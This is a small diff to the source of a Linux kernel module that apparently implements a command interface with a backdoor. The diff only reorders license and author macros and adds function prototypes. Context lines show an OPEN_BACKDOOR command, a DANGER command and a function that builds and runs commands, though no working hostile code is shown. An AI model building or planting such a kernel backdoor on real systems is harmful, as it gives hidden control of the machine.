@@ -5,6 +5,9 @@
 #include <linux/unistd.h>
 #include <linux/string.h>
 
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Jack Dunfey");
+
 #define DEBUG_K
 
 // Time to implement a custom command language in the linux kernel :)
@@ -14,6 +17,11 @@ typedef enum COMMANDS {
     OPEN_BACKDOOR = 2,
     DANGER        = 4
 } command_t;
+
+static int execute_and_get_status(command_t type, char *argument);
+char **split_on_strings(char *string, int *token_count);
+void free_tokens(char **tokens, int token_count);
+int parse_and_run_command(char *raw_input);
 
 static int execute_and_get_status(command_t type, char *argument){
     char command[128] = {0};
@@ -141,6 +149,3 @@ static void __exit misc_device_exit(void) {
 
 module_init(misc_device_init);
 module_exit(misc_device_exit);
-
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Jack Dunfey");
